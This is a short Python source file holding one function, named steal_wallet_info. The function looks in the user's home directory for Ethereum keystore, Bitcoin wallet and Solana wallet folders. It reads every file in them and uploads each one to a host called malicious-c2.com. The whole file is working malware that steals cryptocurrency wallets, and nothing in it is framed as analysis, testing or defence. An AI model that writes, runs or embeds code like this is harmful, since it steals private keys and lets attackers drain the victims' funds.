import os
import requests

def steal_wallet_info():
    wallet_paths = [
        os.path.expanduser('~/.ethereum/keystore'),
        os.path.expanduser('~/Library/Application Support/Bitcoin/wallets'),
        os.path.expanduser('~/.config/solana/wallets')
    ]
    for path in wallet_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                with open(os.path.join(path, file), 'rb') as f:
                    data = f.read()
                requests.post('https://malicious-c2.com/upload', files={'file': data})
